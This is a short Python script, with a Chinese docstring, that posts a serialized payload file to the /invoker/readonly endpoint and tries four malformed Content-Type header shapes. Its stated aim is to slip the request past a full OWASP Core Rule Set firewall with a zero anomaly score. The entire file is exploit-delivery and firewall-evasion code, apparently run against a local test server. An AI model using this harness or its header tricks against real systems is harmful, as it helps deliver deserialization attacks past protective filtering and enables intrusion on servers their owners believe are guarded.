# -*- coding: utf-8 -*-
"""CT 头形状终极测试：空值/纯空白/分号，目标=完整 CRS 下入站 0 分。"""
import socket

data = open("bypass3_mut.ser", "rb").read()


def send(ct_line, name):
    s = socket.create_connection(("127.0.0.1", 18380), timeout=25)
    hdr = "POST /invoker/readonly HTTP/1.1\r\nHost: evil.com\r\n"
    if ct_line is not None:
        hdr += ct_line + "\r\n"
    hdr += "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(data)
    s.sendall(hdr.encode("latin-1") + data)
    resp = b""
    while True:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        resp += c
    s.close()
    print("%-34s -> %s" % (name, resp.split(b"\r\n", 1)[0].decode(errors="replace")[:44]))


send("Content-Type: ", "v1 empty CT value")
send("Content-Type:  ", "v2 spaces-only CT value")
send("Content-Type: ;", "v3 lone-semicolon CT")
send("Content-Type", "v4 CT header, no colon-space")
